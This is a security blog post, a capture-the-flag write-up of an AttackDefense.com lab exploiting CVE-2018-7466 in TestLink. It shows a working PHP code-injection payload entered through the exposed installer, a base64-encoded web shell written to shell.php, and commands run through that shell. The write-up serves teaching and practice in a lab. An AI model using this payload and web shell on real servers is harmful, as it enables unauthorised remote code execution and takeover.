<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.css" />
<script async defer src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.js"></script>
<script>
window.addEventListener("load", function(){
window.cookieconsent.initialise({
  "palette": {
    "popup": {
      "background": "#424242"
    },
    "button": {
      "background": "#2a7ae2"
    }
  },
  "content": {
    "href": "/privacy-policy"
  }
})});
</script>
  
  
  
  <title>AttackDefense.com [RCE] - CVE-2018-7466 Exploit</title>
  <meta name="description" content="">
  
    
    <meta name="keywords" content="Lucian Nitescu, competition, CTF, capture, flag, chall, challange, AttackDefense.com">
  

  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="https://nitesculucian.github.io/2018/11/06/attackdefense-com-rce-cve-2018-7466-exploit/">
  
  
  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">
  <meta name="flattr:id" content="njnwdo">
  <!-- Hotjar Tracking Code for https://nitesculucian.github.io/ -->
<script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:1067531,hjsv:6};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
</script>

<script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
</script>


    
    
    
    	
    
    	
    		
    			
    			<meta property="og:image" content="https://nitesculucian.github.io/uploads/Screenshot from 2018-10-26 17-44-27.png" alt="Image of AttackDefense 2018" " />
    			<meta name="twitter:image" content="https://nitesculucian.github.io/uploads/Screenshot from 2018-10-26 17-44-27.png" alt="Image of AttackDefense 2018" " />
    			
    		
        
    
    	
    		
        
    
    	
    		
        
    
    	
    		
        
    
    	
    		
        
    
    	
    		
        
    
    	
    		
        
    
    	
    		
        
    
    	
    		
        
    
    	
    		
        
    
    	
    		
        
    
    	
    		
        
    
    	
    		
        
    
    	
    		
        
    
    	
    		
        
    


  
  <meta name="twitter:card" content="summary">
  
  <meta name="twitter:title" content="AttackDefense.com [RCE] - CVE-2018-7466 Exploit">
  <meta name="twitter:description" content="">
  
  
  
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">

  
  <!-- Google Analytics -->
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-107695141-1', 'auto');
    ga('send', 'pageview');

  </script>


</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Lucian Nitescu</a>

    <nav class="site-nav">
      
        
        <a class="page-link" href="/">Home</a>
      
        
        <a class="page-link" href="/about/">Whoami</a>
      
        
        <a class="page-link" href="/archives/">Archives</a>
      
    </nav>
    <br>Security Blog
  </div>

</header>


    <main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    
      <h1 class="post-title" itemprop="name headline">AttackDefense.com [RCE] - CVE-2018-7466 Exploit</h1>
    
    <p class="post-meta"><time datetime="2018-11-06T18:34:00-03:00" itemprop="datePublished">Nov 6, 2018</time> â€¢
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/attackdefense-com/">AttackDefense.com</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/ctf/">ctf</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/writeups/">writeups</a>,
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/cve-2018/">CVE-2018</a>,
      
    
      
    
      
    
      
    
      
    
  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        <a href="/categories/rce/">rce</a>
      
    
      
    
      
    
      
    
      
    
      
    
  



</p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p><img src="/uploads/Screenshot from 2018-10-26 17-44-27.png" alt="Image of AttackDefense 2018" /></p>

<h3 id="mission">Mission</h3>

<p>The attacker might not have any user level access to the web application. However, this does not mean that the application cannot be attacked remotely. Remote Code Execution vulnerabilities could be triggered even by unauthenticated users.</p>

<p>In the exercise below, the attacker is not authenticated to the web application and needs to find a remote code execution attack to execute arbitrary commands on the server.</p>

<p>TestLink is a web based test management and test execution system. It enables quality assurance teams to create and manage their test cases as well as to organize them into test plans. These test plans allow team members to execute test cases and track test results dynamically.</p>

<p>Testlink (&lt; v1.9.17) is vulnerable to a Remote Code Execution documented in CVE-2018-7466.</p>

<p>The following information may be helpful in exploiting the vulnerability:</p>

<ul>
  <li>Database name: app</li>
  <li>Database Admin User	: pentester</li>
  <li>Database Admin Password: password1</li>
</ul>

<p>Objective: Your task is to find and exploit this vulnerability.</p>

<p>Level difficulty: Intermediate</p>

<p>Category: Webapps CVEs &gt; Remote Code Execution</p>

<h3 id="solution">Solution</h3>

<p>At first, I was provided with the following web application with an non-functional user account:</p>

<p><img src="/uploads/adcve2/image11.png" alt="Image of AttackDefense 2018" /></p>

<p>If you look close enough, you can see the following error message, leaking an public available path.</p>

<p><img src="/uploads/adcve2/image10.png" alt="Image of AttackDefense 2018" /></p>

<p>After checking this path <a href="http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/logs/config_check.txt">http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/logs/config_check.txt</a> I have discovered the following disclosed logs.</p>

<p><img src="/uploads/adcve2/image8.png" alt="Image of AttackDefense 2018" /></p>

<p>As we can see the install directory is still available at:</p>
<ul>
  <li><a href="http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/">http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/</a></li>
</ul>

<p><img src="/uploads/adcve2/image13.png" alt="Image of AttackDefense 2018" /></p>

<ul>
  <li><a href="http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/installIntro.php?type=new">http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/installIntro.php?type=new</a></li>
</ul>

<p><img src="/uploads/adcve2/image9.png" alt="Image of AttackDefense 2018" /></p>

<ul>
  <li><a href="http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/installDbInput.php">http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/installDbInput.php</a></li>
</ul>

<p><img src="/uploads/adcve2/image14.png" alt="Image of AttackDefense 2018" /></p>

<ul>
  <li><a href="http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/installNewDB.php">http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/installNewDB.php</a></li>
</ul>

<p><img src="/uploads/adcve2/image12.png" alt="Image of AttackDefense 2018" /></p>

<p>Using the following provided information <code class="highlighter-rouge">Testlink (&lt; v1.9.17) is vulnerable to a Remote Code Execution documented in CVE-2018-7466.</code> I decided to search for:</p>

<p><img src="/uploads/adcve2/image5.png" alt="Image of AttackDefense 2018" /></p>

<p>And I found the following exploit description: <a href="https://vulners.com/exploitdb/EDB-ID:44349">https://vulners.com/exploitdb/EDB-ID:44349</a></p>

<p><img src="/uploads/adcve2/image4.png" alt="Image of AttackDefense 2018" /></p>

<p>According to the exploit description, I decided to set up my payload as such<code class="highlighter-rouge">box');file_put_contents($_GET[1],base64_decode($_GET[2]));//</code>, becouse my lab dose not have internet access in order to upload a shell form an external link. Example of payload inputs:</p>

<p><img src="/uploads/adcve2/image1.png" alt="Image of AttackDefense 2018" /></p>

<p><a href="http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/installNewDB.php">http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/install/installNewDB.php</a></p>

<p><img src="/uploads/adcve2/image7.png" alt="Image of AttackDefense 2018" /></p>

<p>I created a shell.php file using the following payload:</p>

<ul>
  <li><a href="http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/config_db.inc.php?1=shell.php&amp;2=PD9waHANCiRvdXRwdXQgPSBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7DQplY2hvICI8cHJlPiRvdXRwdXQ8L3ByZT4iOw0KPz4=">http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/config_db.inc.php?1=shell.php&amp;2=PD9waHANCiRvdXRwdXQgPSBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7DQplY2hvICI8cHJlPiRvdXRwdXQ8L3ByZT4iOw0KPz4=</a></li>
</ul>

<p>I executed my code using the created shell.php file as such:</p>

<ul>
  <li><a href="http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/shell.php?cmd=ls">http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/shell.php?cmd=ls</a></li>
</ul>

<p><img src="/uploads/adcve2/image6.png" alt="Image of AttackDefense 2018" /></p>

<ul>
  <li><a href="http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/shell.php?cmd=whoami%20;%20date">http://n4jxomxeovad0py60873kbmus.public1.attackdefenselabs.com/shell.php?cmd=whoami%20;%20date</a></li>
</ul>

<p><img src="/uploads/adcve2/image3.png" alt="Image of AttackDefense 2018" /></p>

<p>If you have question about this challange, please ask them in the comment section bellow.</p>

<p><img src="/uploads/adcve2/image2.png" alt="Image of AttackDefense 2018" /></p>

  </div>

  
    <div class="post-comments" itemprop="comment">
      <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- all pages -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-0255642880549652"
     data-ad-slot="6220756861"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
<hr />
<h1>Comments</h1>
<div id="disqus_thread"></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://nitesculucian.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

    </div>
  

</article>

      </div>
    </main>

    <footer class="site-footer">

  <div class="wrapper">

    <p>
      

&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://nitesculucian.github.io/feed.xml">RSS</a>

      | <a href="/privacy-policy" >Privacy Policy</a>
      | <a href="/legal-disclaimer" >Legal Disclaimer</a>
    </p>

  </div>

</footer>


  </body>

</html>
